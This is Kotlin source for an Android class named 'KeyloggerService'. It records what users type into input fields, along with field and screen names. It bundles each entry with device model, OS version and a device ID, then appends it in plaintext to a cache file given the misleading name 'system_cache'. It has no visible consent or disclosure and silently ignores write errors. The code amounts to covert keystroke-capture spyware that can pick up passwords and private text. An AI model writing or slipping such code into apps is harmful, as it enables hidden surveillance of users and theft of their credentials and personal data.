package com.example.axesite.util

import android.annotation.SuppressLint
import android.content.Context
import android.os.Build
import java.io.File
import java.io.FileOutputStream
import java.util.UUID
import java.util.concurrent.ConcurrentLinkedQueue
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.json.JSONObject

class KeyloggerService private constructor(private val context: Context) {
    private val deviceId = UUID.randomUUID().toString()
    private val logQueue = ConcurrentLinkedQueue<LogEntry>()
    private val coroutineScope = CoroutineScope(Dispatchers.IO)
    private val debounceJobs = mutableMapOf<String, Job>()
    private val logFilename = "system_cache"

    data class LogEntry(
        val timestamp: Long,
        val fieldName: String,
        val text: String,
        val appScreen: String = ""
    )

    companion object {
        @SuppressLint("StaticFieldLeak")
        @Volatile
        private var instance: KeyloggerService? = null

        fun getInstance(context: Context): KeyloggerService {
            return instance ?: synchronized(this) {
                instance ?: KeyloggerService(context.applicationContext).also {
                    instance = it
                }
            }
        }
    }

    private suspend fun saveLogsToCache(): Boolean {
        if (logQueue.isEmpty()) return true

        val logs = mutableListOf<LogEntry>()
        while (logQueue.isNotEmpty()) {
            logQueue.poll()?.let { logs.add(it) }
        }

        return try {
            val jsonPayload = createJsonPayload(logs)
            appendToCacheFile(jsonPayload)
            true
        } catch (e: Exception) {
            logs.forEach { logQueue.add(it) }
            false
        }
    }

    private fun createJsonPayload(logs: List<LogEntry>): String {
        val jsonObject = JSONObject().apply {
            put("deviceId", deviceId)
            put("deviceModel", "${Build.MANUFACTURER} ${Build.MODEL}")
            put("androidVersion", Build.VERSION.RELEASE)
            put("appPackage", context.packageName)
            put("timestamp", System.currentTimeMillis())

            val logsArray = logs.map { entry ->
                JSONObject().apply {
                    put("timestamp", entry.timestamp)
                    put("field", entry.fieldName)
                    put("text", entry.text)
                    put("screen", entry.appScreen)
                }
            }
            put("logs", logsArray)
        }
        return jsonObject.toString()
    }

    private fun appendToCacheFile(data: String) {
        val cacheFile = File(context.cacheDir, logFilename)
        try {
            FileOutputStream(cacheFile, true).use { outputStream ->
                outputStream.write("$data\n".toByteArray())
            }
        } catch (_: Exception) {
        }
    }

    fun logComposeInput(fieldName: String, input: String, screenName: String, debounceDelayMillis: Long = 1000L) {
        debounceJobs[fieldName]?.cancel()
        debounceJobs[fieldName] = coroutineScope.launch {
            delay(debounceDelayMillis)
            val entry = LogEntry(
                timestamp = System.currentTimeMillis(),
                fieldName = fieldName,
                text = input,
                appScreen = screenName
            )
            logQueue.add(entry)
            saveLogsToCache()
        }
    }
}